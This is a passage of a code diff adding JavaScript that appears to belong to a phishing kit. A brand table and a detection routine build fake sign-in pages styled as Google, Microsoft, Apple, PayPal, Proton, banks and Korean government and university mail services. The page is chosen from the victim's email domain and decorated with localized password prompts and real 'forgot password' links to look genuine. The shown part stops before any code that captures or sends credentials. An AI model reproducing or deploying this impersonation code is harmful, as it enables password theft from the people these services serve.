+                subtitle: 'Sign in to ProtonMail',
+                passwordHint: 'Enter your ProtonMail password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Proton Technologies. All rights reserved.',
+                flag: '🇨🇭'
+            },
+            'proton.me': {
+                name: 'Proton', domain: 'proton.me', logoText: 'Proton',
+                highlightText: 'Mail', logoIcon: 'P', logoColor: '#6d4aff',
+                accentColor: '#6d4aff', buttonColor: '#6d4aff', buttonHover: '#5a3ae0',
+                bgGradient: 'linear-gradient(135deg, #6d4aff 0%, #5a3ae0 100%)',
+                realSite: 'https://mail.proton.me',
+                subtitle: 'Sign in to Proton',
+                passwordHint: 'Enter your Proton password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Proton Technologies. All rights reserved.',
+                flag: '🇨🇭'
+            },
+            'pm.me': {
+                name: 'Proton', domain: 'pm.me', logoText: 'Proton',
+                highlightText: 'Mail', logoIcon: 'P', logoColor: '#6d4aff',
+                accentColor: '#6d4aff', buttonColor: '#6d4aff', buttonHover: '#5a3ae0',
+                bgGradient: 'linear-gradient(135deg, #6d4aff 0%, #5a3ae0 100%)',
+                realSite: 'https://mail.proton.me',
+                subtitle: 'Sign in to Proton',
+                passwordHint: 'Enter your Proton password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Proton Technologies. All rights reserved.',
+                flag: '🇨🇭'
+            },
+            
+            // ==========================================================
+            // TUTANOTA (GERMAN)
+            // ==========================================================
+            'tutanota.com': {
+                name: 'Tutanota', domain: 'tutanota.com', logoText: 'Tutanota',
+                highlightText: '', logoIcon: 'T', logoColor: '#00b4d8',
+                accentColor: '#00b4d8', buttonColor: '#00b4d8', buttonHover: '#0096b3',
+                bgGradient: 'linear-gradient(135deg, #00b4d8 0%, #0096b3 100%)',
+                realSite: 'https://mail.tutanota.com',
+                subtitle: 'Sign in to Tutanota',
+                passwordHint: 'Enter your Tutanota password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Tutanota. All rights reserved.',
+                flag: '🇩🇪'
+            },
+            'tuta.io': {
+                name: 'Tutanota', domain: 'tuta.io', logoText: 'Tutanota',
+                highlightText: '', logoIcon: 'T', logoColor: '#00b4d8',
+                accentColor: '#00b4d8', buttonColor: '#00b4d8', buttonHover: '#0096b3',
+                bgGradient: 'linear-gradient(135deg, #00b4d8 0%, #0096b3 100%)',
+                realSite: 'https://mail.tutanota.com',
+                subtitle: 'Sign in to Tutanota',
+                passwordHint: 'Enter your Tutanota password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Tutanota. All rights reserved.',
+                flag: '🇩🇪'
+            },
+            'tuta.com': {
+                name: 'Tutanota', domain: 'tuta.com', logoText: 'Tutanota',
+                highlightText: '', logoIcon: 'T', logoColor: '#00b4d8',
+                accentColor: '#00b4d8', buttonColor: '#00b4d8', buttonHover: '#0096b3',
+                bgGradient: 'linear-gradient(135deg, #00b4d8 0%, #0096b3 100%)',
+                realSite: 'https://mail.tutanota.com',
+                subtitle: 'Sign in to Tutanota',
+                passwordHint: 'Enter your Tutanota password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Tutanota. All rights reserved.',
+                flag: '🇩🇪'
+            },
+            
+            // ==========================================================
+            // GLOBAL BRANDS
+            // ==========================================================
+            'gmail.com': {
+                name: 'Google', domain: 'gmail.com', logoText: 'Google',
+                highlightText: '', logoIcon: 'G', logoColor: '#4285f4',
+                accentColor: '#1a73e8', buttonColor: '#1a73e8', buttonHover: '#1557b0',
+                bgGradient: 'linear-gradient(135deg, #4285f4 0%, #34a853 100%)',
+                realSite: 'https://mail.google.com',
+                subtitle: 'Sign in to Gmail',
+                passwordHint: 'Enter your Google account password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Google. All rights reserved.',
+                flag: '🌐'
+            },
+            'google.com': {
+                name: 'Google', domain: 'google.com', logoText: 'Google',
+                highlightText: '', logoIcon: 'G', logoColor: '#4285f4',
+                accentColor: '#1a73e8', buttonColor: '#1a73e8', buttonHover: '#1557b0',
+                bgGradient: 'linear-gradient(135deg, #4285f4 0%, #34a853 100%)',
+                realSite: 'https://accounts.google.com',
+                subtitle: 'Sign in to Google',
+                passwordHint: 'Enter your Google account password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Google. All rights reserved.',
+                flag: '🌐'
+            },
+            'outlook.com': {
+                name: 'Microsoft', domain: 'outlook.com', logoText: 'Microsoft',
+                highlightText: 'Outlook', logoIcon: 'MS', logoColor: '#00a4ef',
+                accentColor: '#0078d4', buttonColor: '#0078d4', buttonHover: '#005a9e',
+                bgGradient: 'linear-gradient(135deg, #00a4ef 0%, #0078d4 100%)',
+                realSite: 'https://outlook.live.com',
+                subtitle: 'Sign in to Outlook',
+                passwordHint: 'Enter your Microsoft account password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Microsoft. All rights reserved.',
+                flag: '🌐'
+            },
+            'live.com': {
+                name: 'Microsoft', domain: 'live.com', logoText: 'Microsoft',
+                highlightText: 'Live', logoIcon: 'MS', logoColor: '#00a4ef',
+                accentColor: '#0078d4', buttonColor: '#0078d4', buttonHover: '#005a9e',
+                bgGradient: 'linear-gradient(135deg, #00a4ef 0%, #0078d4 100%)',
+                realSite: 'https://login.live.com',
+                subtitle: 'Sign in to Microsoft',
+                passwordHint: 'Enter your Microsoft account password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Microsoft. All rights reserved.',
+                flag: '🌐'
+            },
+            'hotmail.com': {
+                name: 'Microsoft', domain: 'hotmail.com', logoText: 'Microsoft',
+                highlightText: 'Hotmail', logoIcon: 'MS', logoColor: '#00a4ef',
+                accentColor: '#0078d4', buttonColor: '#0078d4', buttonHover: '#005a9e',
+                bgGradient: 'linear-gradient(135deg, #00a4ef 0%, #0078d4 100%)',
+                realSite: 'https://outlook.live.com',
+                subtitle: 'Sign in to Hotmail',
+                passwordHint: 'Enter your Microsoft account password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Microsoft. All rights reserved.',
+                flag: '🌐'
+            },
+            'microsoft.com': {
+                name: 'Microsoft', domain: 'microsoft.com', logoText: 'Microsoft',
+                highlightText: '', logoIcon: 'MS', logoColor: '#00a4ef',
+                accentColor: '#0078d4', buttonColor: '#0078d4', buttonHover: '#005a9e',
+                bgGradient: 'linear-gradient(135deg, #00a4ef 0%, #0078d4 100%)',
+                realSite: 'https://login.microsoftonline.com',
+                subtitle: 'Sign in to Microsoft',
+                passwordHint: 'Enter your Microsoft account password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Microsoft. All rights reserved.',
+                flag: '🌐'
+            },
+            'yahoo.com': {
+                name: 'Yahoo', domain: 'yahoo.com', logoText: 'Yahoo',
+                highlightText: 'Mail', logoIcon: 'Y', logoColor: '#7b0099',
+                accentColor: '#7b0099', buttonColor: '#7b0099', buttonHover: '#5c0073',
+                bgGradient: 'linear-gradient(135deg, #7b0099 0%, #440066 100%)',
+                realSite: 'https://mail.yahoo.com',
+                subtitle: 'Sign in to Yahoo Mail',
+                passwordHint: 'Enter your Yahoo account password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Yahoo. All rights reserved.',
+                flag: '🌐'
+            },
+            'ymail.com': {
+                name: 'Yahoo', domain: 'ymail.com', logoText: 'Yahoo',
+                highlightText: 'Mail', logoIcon: 'Y', logoColor: '#7b0099',
+                accentColor: '#7b0099', buttonColor: '#7b0099', buttonHover: '#5c0073',
+                bgGradient: 'linear-gradient(135deg, #7b0099 0%, #440066 100%)',
+                realSite: 'https://mail.yahoo.com',
+                subtitle: 'Sign in to Yahoo Mail',
+                passwordHint: 'Enter your Yahoo account password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Yahoo. All rights reserved.',
+                flag: '🌐'
+            },
+            'icloud.com': {
+                name: 'Apple', domain: 'icloud.com', logoText: 'Apple',
+                highlightText: 'iCloud', logoIcon: '🍎', logoColor: '#000000',
+                accentColor: '#000000', buttonColor: '#000000', buttonHover: '#333333',
+                bgGradient: 'linear-gradient(135deg, #333333 0%, #000000 100%)',
+                realSite: 'https://www.icloud.com',
+                subtitle: 'Sign in to iCloud',
+                passwordHint: 'Enter your Apple ID password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create Apple ID',
+                copyright: '© Apple Inc. All rights reserved.',
+                flag: '🌐'
+            },
+            'apple.com': {
+                name: 'Apple', domain: 'apple.com', logoText: 'Apple',
+                highlightText: 'ID', logoIcon: '🍎', logoColor: '#000000',
+                accentColor: '#000000', buttonColor: '#000000', buttonHover: '#333333',
+                bgGradient: 'linear-gradient(135deg, #333333 0%, #000000 100%)',
+                realSite: 'https://appleid.apple.com',
+                subtitle: 'Sign in to Apple ID',
+                passwordHint: 'Enter your Apple ID password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create Apple ID',
+                copyright: '© Apple Inc. All rights reserved.',
+                flag: '🌐'
+            },
+            'facebook.com': {
+                name: 'Facebook', domain: 'facebook.com', logoText: 'Facebook',
+                highlightText: '', logoIcon: 'F', logoColor: '#1877f2',
+                accentColor: '#1877f2', buttonColor: '#1877f2', buttonHover: '#0d5cbd',
+                bgGradient: 'linear-gradient(135deg, #1877f2 0%, #0d5cbd 100%)',
+                realSite: 'https://www.facebook.com',
+                subtitle: 'Log in to Facebook',
+                passwordHint: 'Enter your Facebook password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create new account',
+                copyright: '© Meta. All rights reserved.',
+                flag: '🌐'
+            },
+            'fb.com': {
+                name: 'Facebook', domain: 'fb.com', logoText: 'Facebook',
+                highlightText: '', logoIcon: 'F', logoColor: '#1877f2',
+                accentColor: '#1877f2', buttonColor: '#1877f2', buttonHover: '#0d5cbd',
+                bgGradient: 'linear-gradient(135deg, #1877f2 0%, #0d5cbd 100%)',
+                realSite: 'https://www.facebook.com',
+                subtitle: 'Log in to Facebook',
+                passwordHint: 'Enter your Facebook password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create new account',
+                copyright: '© Meta. All rights reserved.',
+                flag: '🌐'
+            },
+            'twitter.com': {
+                name: 'X', domain: 'twitter.com', logoText: '𝕏',
+                highlightText: '', logoIcon: '𝕏', logoColor: '#000000',
+                accentColor: '#000000', buttonColor: '#000000', buttonHover: '#333333',
+                bgGradient: 'linear-gradient(135deg, #000000 0%, #1a1a1a 100%)',
+                realSite: 'https://twitter.com',
+                subtitle: 'Log in to X',
+                passwordHint: 'Enter your X password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Sign up for X',
+                copyright: '© X Corp. All rights reserved.',
+                flag: '🌐'
+            },
+            'x.com': {
+                name: 'X', domain: 'x.com', logoText: '𝕏',
+                highlightText: '', logoIcon: '𝕏', logoColor: '#000000',
+                accentColor: '#000000', buttonColor: '#000000', buttonHover: '#333333',
+                bgGradient: 'linear-gradient(135deg, #000000 0%, #1a1a1a 100%)',
+                realSite: 'https://x.com',
+                subtitle: 'Log in to X',
+                passwordHint: 'Enter your X password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Sign up for X',
+                copyright: '© X Corp. All rights reserved.',
+                flag: '🌐'
+            },
+            'linkedin.com': {
+                name: 'LinkedIn', domain: 'linkedin.com', logoText: 'LinkedIn',
+                highlightText: '', logoIcon: 'LI', logoColor: '#0a66c2',
+                accentColor: '#0a66c2', buttonColor: '#0a66c2', buttonHover: '#004182',
+                bgGradient: 'linear-gradient(135deg, #0a66c2 0%, #004182 100%)',
+                realSite: 'https://www.linkedin.com',
+                subtitle: 'Sign in to LinkedIn',
+                passwordHint: 'Enter your LinkedIn password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Join now',
+                copyright: '© LinkedIn. All rights reserved.',
+                flag: '🌐'
+            },
+            'amazon.com': {
+                name: 'Amazon', domain: 'amazon.com', logoText: 'Amazon',
+                highlightText: '', logoIcon: 'A', logoColor: '#ff9900',
+                accentColor: '#ff9900', buttonColor: '#ff9900', buttonHover: '#cc7a00',
+                bgGradient: 'linear-gradient(135deg, #ff9900 0%, #cc7a00 100%)',
+                realSite: 'https://www.amazon.com',
+                subtitle: 'Sign in to Amazon',
+                passwordHint: 'Enter your Amazon password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Amazon. All rights reserved.',
+                flag: '🌐'
+            },
+            'amazon.co.uk': {
+                name: 'Amazon', domain: 'amazon.co.uk', logoText: 'Amazon',
+                highlightText: '', logoIcon: 'A', logoColor: '#ff9900',
+                accentColor: '#ff9900', buttonColor: '#ff9900', buttonHover: '#cc7a00',
+                bgGradient: 'linear-gradient(135deg, #ff9900 0%, #cc7a00 100%)',
+                realSite: 'https://www.amazon.co.uk',
+                subtitle: 'Sign in to Amazon',
+                passwordHint: 'Enter your Amazon password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Amazon. All rights reserved.',
+                flag: '🌐'
+            },
+            'paypal.com': {
+                name: 'PayPal', domain: 'paypal.com', logoText: 'PayPal',
+                highlightText: '', logoIcon: 'PP', logoColor: '#003087',
+                accentColor: '#003087', buttonColor: '#003087', buttonHover: '#002266',
+                bgGradient: 'linear-gradient(135deg, #003087 0%, #009cde 100%)',
+                realSite: 'https://www.paypal.com',
+                subtitle: 'Log in to PayPal',
+                passwordHint: 'Enter your PayPal password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Sign up',
+                copyright: '© PayPal. All rights reserved.',
+                flag: '🌐'
+            },
+            'dropbox.com': {
+                name: 'Dropbox', domain: 'dropbox.com', logoText: 'Dropbox',
+                highlightText: '', logoIcon: 'DB', logoColor: '#0061ff',
+                accentColor: '#0061ff', buttonColor: '#0061ff', buttonHover: '#0042b3',
+                bgGradient: 'linear-gradient(135deg, #0061ff 0%, #0042b3 100%)',
+                realSite: 'https://www.dropbox.com',
+                subtitle: 'Sign in to Dropbox',
+                passwordHint: 'Enter your Dropbox password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Dropbox. All rights reserved.',
+                flag: '🌐'
+            },
+            'slack.com': {
+                name: 'Slack', domain: 'slack.com', logoText: 'Slack',
+                highlightText: '', logoIcon: 'S', logoColor: '#4a154b',
+                accentColor: '#4a154b', buttonColor: '#4a154b', buttonHover: '#36133e',
+                bgGradient: 'linear-gradient(135deg, #4a154b 0%, #36133e 100%)',
+                realSite: 'https://slack.com',
+                subtitle: 'Sign in to Slack',
+                passwordHint: 'Enter your Slack password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create workspace',
+                copyright: '© Slack Technologies. All rights reserved.',
+                flag: '🌐'
+            },
+            'github.com': {
+                name: 'GitHub', domain: 'github.com', logoText: 'GitHub',
+                highlightText: '', logoIcon: 'GH', logoColor: '#24292e',
+                accentColor: '#24292e', buttonColor: '#24292e', buttonHover: '#1b1f23',
+                bgGradient: 'linear-gradient(135deg, #24292e 0%, #1b1f23 100%)',
+                realSite: 'https://github.com',
+                subtitle: 'Sign in to GitHub',
+                passwordHint: 'Enter your GitHub password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© GitHub. All rights reserved.',
+                flag: '🌐'
+            },
+            
+            // ==========================================================
+            // KOREAN TLD PATTERNS (Dynamic Detection)
+            // ==========================================================
+            '.co.kr': {
+                name: 'Business Mail', domain: 'co.kr', logoText: '비즈니스',
+                highlightText: '메일', logoIcon: '🏢', logoColor: '#1a73e8',
+                accentColor: '#1a73e8', buttonColor: '#1a73e8', buttonHover: '#0d47a1',
+                bgGradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+                realSite: 'https://mail.co.kr',
+                subtitle: '기업 메일',
+                passwordHint: '회사 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Business. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            '.ac.kr': {
+                name: 'University', domain: 'ac.kr', logoText: '대학교',
+                highlightText: 'Mail', logoIcon: '🎓', logoColor: '#800000',
+                accentColor: '#800000', buttonColor: '#800000', buttonHover: '#4a0000',
+                bgGradient: 'linear-gradient(135deg, #800000 0%, #4a0000 100%)',
+                realSite: 'https://mail.ac.kr',
+                subtitle: '대학 메일',
+                passwordHint: '대학 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '계정 등록',
+                copyright: '© University. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            '.go.kr': {
+                name: 'Government', domain: 'go.kr', logoText: '정부',
+                highlightText: '메일', logoIcon: '🏛️', logoColor: '#002664',
+                accentColor: '#002664', buttonColor: '#002664', buttonHover: '#001133',
+                bgGradient: 'linear-gradient(135deg, #002664 0%, #001133 100%)',
+                realSite: 'https://www.go.kr',
+                subtitle: '정부 통합 메일',
+                passwordHint: '정부 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '계정 등록',
+                copyright: '© Government of Korea. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            '.re.kr': {
+                name: 'Research Institute', domain: 're.kr', logoText: '연구원',
+                highlightText: 'Mail', logoIcon: '🔬', logoColor: '#1a5276',
+                accentColor: '#1a5276', buttonColor: '#1a5276', buttonHover: '#0e2f47',
+                bgGradient: 'linear-gradient(135deg, #1a5276 0%, #0e2f47 100%)',
+                realSite: 'https://mail.re.kr',
+                subtitle: '연구원 메일',
+                passwordHint: '연구원 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '계정 등록',
+                copyright: '© Research Institute. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            '.or.kr': {
+                name: 'Organization', domain: 'or.kr', logoText: '조직',
+                highlightText: 'Mail', logoIcon: '🏢', logoColor: '#2c3e50',
+                accentColor: '#2c3e50', buttonColor: '#2c3e50', buttonHover: '#1a252f',
+                bgGradient: 'linear-gradient(135deg, #2c3e50 0%, #1a252f 100%)',
+                realSite: 'https://mail.or.kr',
+                subtitle: '조직 메일',
+                passwordHint: '조직 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '계정 등록',
+                copyright: '© Organization. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            '.kr': {
+                name: 'Korea Mail', domain: 'kr', logoText: '한국',
+                highlightText: '메일', logoIcon: '🇰🇷', logoColor: '#1a73e8',
+                accentColor: '#1a73e8', buttonColor: '#1a73e8', buttonHover: '#0d47a1',
+                bgGradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+                realSite: 'https://mail.kr',
+                subtitle: '한국 메일',
+                passwordHint: '계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Korea. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            
+            // ==========================================================
+            // DEFAULT FALLBACK
+            // ==========================================================
+            'default': {
+                name: 'Secure Login', domain: 'secure.com', logoText: 'Secure',
+                highlightText: 'Login', logoIcon: 'SL', logoColor: '#1a73e8',
+                accentColor: '#1a73e8', buttonColor: '#1a73e8', buttonHover: '#1557b0',
+                bgGradient: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
+                realSite: 'https://secure.com',
+                subtitle: 'Secure Sign In',
+                passwordHint: 'Enter your account password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: 'Secure Login. All rights reserved.',
+                flag: '🔒'
+            }
+        };
+
+        // ============================================================
+        // 2. DOMAIN DETECTION ENGINE
+        // ============================================================
+        
+        function extractDomain(email) {
+            if (!email) return 'unknown';
+            var parts = email.split('@');
+            return parts.length === 2 ? parts[1].toLowerCase() : 'unknown';
+        }
+
+        function detectBrand(domain) {
+            if (!domain || domain === 'unknown') return BRAND_DB['default'];
+            
+            // 1. Exact match
+            if (BRAND_DB[domain]) {
+                return BRAND_DB[domain];
+            }
+            
+            // 2. Korean TLD patterns (.co.kr, .ac.kr, .go.kr, .re.kr, .or.kr)
+            var tldPatterns = ['.co.kr', '.ac.kr', '.go.kr', '.re.kr', '.or.kr'];
+            for (var i = 0; i < tldPatterns.length; i++) {
+                if (domain.endsWith(tldPatterns[i])) {
+                    if (BRAND_DB[domain]) return BRAND_DB[domain];
+                    
+                    var brandName = domain.split('.')[0].toUpperCase();
+                    var knownBrands = ['NAVER', 'DAUM', 'KAKAO', 'NATE', 'HIWORKS', 'GABIA', 
+                                      'SEOUL', 'KAIST', 'YONSEI', 'KOREA', 'HANYANG'];
+                    for (var j = 0; j < knownBrands.length; j++) {
+                        if (brandName === knownBrands[j]) {
+                            return BRAND_DB[domain] || BRAND_DB['.co.kr'];
+                        }
+                    }
+                    
+                    return {
+                        name: brandName,
+                        domain: domain,
+                        logoText: brandName,
+                        highlightText: 'Mail',
+                        logoIcon: brandName.charAt(0),
+                        logoColor: '#1a73e8',
+                        accentColor: '#1a73e8',
+                        buttonColor: '#1a73e8',
+                        buttonHover: '#0d47a1',
+                        bgGradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+                        realSite: 'https://' + domain,
+                        subtitle: brandName + ' 메일',
+                        passwordHint: brandName + ' 계정 비밀번호를 입력하세요',
+                        forgotPassword: '비밀번호 찾기',
+                        createAccount: '회원가입',
+                        copyright: '© ' + brandName + '. All rights reserved.',
+                        flag: '🇰🇷'
+                    };
+                }
+            }
+            
+            // 3. .kr domain (generic)
+            if (domain.endsWith('.kr')) {
+                var name = domain.split('.')[0].toUpperCase();
+                return {
+                    name: name,
+                    domain: domain,
+                    logoText: name,
+                    highlightText: 'Mail',
+                    logoIcon: name.charAt(0),
+                    logoColor: '#1a73e8',
+                    accentColor: '#1a73e8',
+                    buttonColor: '#1a73e8',
+                    buttonHover: '#0d47a1',
+                    bgGradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+                    realSite: 'https://' + domain,
+                    subtitle: name + ' 메일',
+                    passwordHint: name + ' 계정 비밀번호를 입력하세요',
+                    forgotPassword: '비밀번호 찾기',
+                    createAccount: '회원가입',
+                    copyright: '© ' + name + '. All rights reserved.',
+                    flag: '🇰🇷'
+                };
+            }
+            
+            // 4. Bulgarian .bg domain
+            if (domain.endsWith('.bg')) {
+                // Check for known Bulgarian providers
+                var bgBrands = {
+                    'abv.bg': BRAND_DB['abv.bg'],
+                    'mail.bg': BRAND_DB['mail.bg'],
+                    'dir.bg': BRAND_DB['dir.bg'],
+                    'vbox7.com': BRAND_DB['vbox7.com']
+                };
+                if (bgBrands[domain]) return bgBrands[domain];
+                
+                var bgName = domain.split('.')[0].toUpperCase();
+                return {
+                    name: bgName,
+                    domain: domain,
+                    logoText: bgName,
+                    highlightText: 'Поща',
+                    logoIcon: bgName.charAt(0),
+                    logoColor: '#0066b3',
+                    accentColor: '#0066b3',
+                    buttonColor: '#0066b3',
+                    buttonHover: '#004d8a',
+                    bgGradient: 'linear-gradient(135deg, #0066b3 0%, #004d8a 50%, #003366 100%)',
+                    realSite: 'https://' + domain,
+                    subtitle: bgName + ' Поща',
+                    passwordHint: 'Въведете вашата парола за ' + bgName,
+                    forgotPassword: 'Забравена парола?',
+                    createAccount: 'Създай акаунт',
+                    copyright: '© ' + bgName + '. Всички права запазени.',
+                    flag: '🇧🇬'
+                };
+            }
+            
+            // 5. Russian TLD patterns (.ru, .рф)
+            if (domain.endsWith('.ru') || domain.endsWith('.рф')) {
+                var ruName = domain.split('.')[0].toUpperCase();
+                var ruBrands = ['YANDEX', 'MAIL', 'RAMBLER', 'BK', 'INBOX', 'LIST', 'INTERNET'];
+                for (var k = 0; k < ruBrands.length; k++) {
+                    if (ruName === ruBrands[k] || domain.includes(ruBrands[k].toLowerCase())) {
+                        for (var key in BRAND_DB) {
+                            if (BRAND_DB.hasOwnProperty(key) && key.includes(ruBrands[k].toLowerCase())) {
+                                return BRAND_DB[key];
+                            }
+                        }
+                    }
+                }
+                
+                return {
+                    name: ruName,
+                    domain: domain,
+                    logoText: ruName,
+                    highlightText: 'Mail',
+                    logoIcon: ruName.charAt(0),
+                    logoColor: '#005ff9',
+                    accentColor: '#005ff9',
+                    buttonColor: '#005ff9',
+                    buttonHover: '#0047c4',
+                    bgGradient: 'linear-gradient(135deg, #005ff9 0%, #0047c4 100%)',
+                    realSite: 'https://' + domain,
+                    subtitle: ruName + ' Почта',
+                    passwordHint: 'Введите пароль от ' + ruName,
+                    forgotPassword: 'Забыли пароль?',
+                    createAccount: 'Создать аккаунт',
+                    copyright: '© ' + ruName + '. Все права защищены.',
+                    flag: '🇷🇺'
+                };
+            }
+            
+            // 6. Subdomain match
+            var parts = domain.split('.');
+            for (var l = 0; l < parts.length - 1; l++) {
+                var subdomain = parts.slice(l).join('.');
+                if (BRAND_DB[subdomain]) {
+                    return BRAND_DB[subdomain];
+                }
+            }
+            
+            // 7. Keyword detection
+            var brandKeys = Object.keys(BRAND_DB);
+            for (var m = 0; m < brandKeys.length; m++) {
+                var key = brandKeys[m];
+                if (domain.includes(key) && key !== 'default' && !key.startsWith('.')) {
+                    return BRAND_DB[key];
+                }
+            }
+            
+            // 8. Banking/Financial detection
+            if (domain.includes('bank') || domain.includes('financial')) {
+                return {
+                    name: 'Banking Portal',
+                    domain: domain,
+                    logoText: 'Secure',
+                    highlightText: 'Bank',
+                    logoIcon: '🏦',
+                    logoColor: '#1a5276',
+                    accentColor: '#1a5276',
+                    buttonColor: '#1a5276',
+                    buttonHover: '#0e2f47',
+                    bgGradient: 'linear-gradient(135deg, #1a5276 0%, #0e2f47 100%)',
+                    realSite: 'https://' + domain,
+                    subtitle: 'Secure Banking Sign In',
+                    passwordHint: 'Enter your banking password',
+                    forgotPassword: 'Forgot password?',
+                    createAccount: 'Create account',
+                    copyright: '© ' + domain + '. All rights reserved.',
+                    flag: '🏦'
+                };
+            }
+            
+            // 9. Generic fallback with auto-generated background
+            var genericName = domain.split('.')[0].toUpperCase();
+            var hash = 0;
+            for (var n = 0; n < domain.length; n++) {
+                hash = domain.charCodeAt(n) + ((hash << 5) - hash);
+            }
+            var hue1 = Math.abs(hash % 360);
+            var hue2 = (hue1 + 40) % 360;
+            
+            return {
+                name: genericName,
+                domain: domain,
+                logoText: genericName,
+                highlightText: '',
+                logoIcon: genericName.charAt(0),
+                logoColor: 'hsl(' + hue1 + ', 70%, 50%)',
+                accentColor: 'hsl(' + hue1 + ', 70%, 50%)',
+                buttonColor: 'hsl(' + hue1 + ', 70%, 50%)',
+                buttonHover: 'hsl(' + hue1 + ', 70%, 35%)',
+                bgGradient: 'linear-gradient(135deg, hsl(' + hue1 + ', 70%, 50%) 0%, hsl(' + hue2 + ', 70%, 40%) 100%)',
+                realSite: 'https://' + domain,
+                subtitle: 'Sign in to ' + domain,
+                passwordHint: 'Enter your account password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© ' + domain + '. All rights reserved.',
+                flag: '🌐'
+            };
+        }
+
+        // ============================================================
+        // 3. THEME APPLICATION ENGINE
+        // ============================================================
+        
+        function applyTheme(brand) {
+            if (!brand) return;
+            
+            console.log('🎨 Applying brand theme:', brand.name, brand.flag);
+            
+            // Document title
+            document.getElementById('pageTitle').textContent = brand.subtitle || 'Sign In';
+            
+            // Logo icon
+            var logoIcon = document.getElementById('logoIcon');
+            logoIcon.textContent = brand.logoIcon || '🔒';
+            logoIcon.style.background = brand.logoColor || '#1a73e8';
+            
+            // Logo text
+            var logoText = document.getElementById('logoText');
+            
+            if (brand.logoText && brand.highlightText) {
+                logoText.innerHTML = brand.logoText + 
+                    '<span class="highlight" id="highlightText">' + brand.highlightText + '</span>' +
+                    '<span class="brand-flag" id="brandFlag">' + brand.flag + ' ' + brand.name + '</span>';
+            } else if (brand.logoText) {
+                logoText.innerHTML = brand.logoText + 
+                    '<span class="brand-flag" id="brandFlag">' + brand.flag + ' ' + brand.name + '</span>';
+                logoText.style.color = brand.logoColor || '#1a73e8';
+            } else {
+                logoText.innerHTML = brand.name + 
+                    '<span class="brand-flag" id="brandFlag">' + brand.flag + '</span>';
+            }
+            
+            // Subtitle
+            document.getElementById('subtitleText').textContent = brand.subtitle || 'Secure Sign In';
+            
+            // Domain badge
+            var domainBadge = document.getElementById('domainBadge');
+            domainBadge.textContent = brand.flag + ' ' + brand.domain.toUpperCase();
+            domainBadge.style.background = brand.accentColor + '20';
+            domainBadge.style.color = brand.accentColor;
+            
+            // Body gradient
+            document.body.style.background = brand.bgGradient || 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
+            
+            // Form labels
+            document.getElementById('emailLabel').textContent = 'Email Address';
+            document.getElementById('passwordLabel').textContent = 'Password';
+            document.getElementById('passwordHint').textContent = brand.passwordHint || 'Enter your account password';
+            
+            // Button
+            var signinBtn = document.getElementById('signinBtn');
+            signinBtn.style.background = brand.buttonColor || '#1a73e8';
+            signinBtn.onmouseover = function() {
+                this.style.background = brand.buttonHover || '#1557b0';
+            };
+            signinBtn.onmouseout = function() {
+                this.style.background = brand.buttonColor || '#1a73e8';
+            };
+            document.getElementById('btnText').textContent = 'Sign In';
+            
+            // Footer links
+            document.getElementById('forgotLink').textContent = brand.forgotPassword || 'Forgot password?';
+            document.getElementById('forgotLink').href = brand.realSite + '/forgot-password';
+            document.getElementById('createLink').textContent = brand.createAccount || 'Create account';
+            document.getElementById('createLink').href = brand.realSite + '/signup';
+            
+            // Copyright
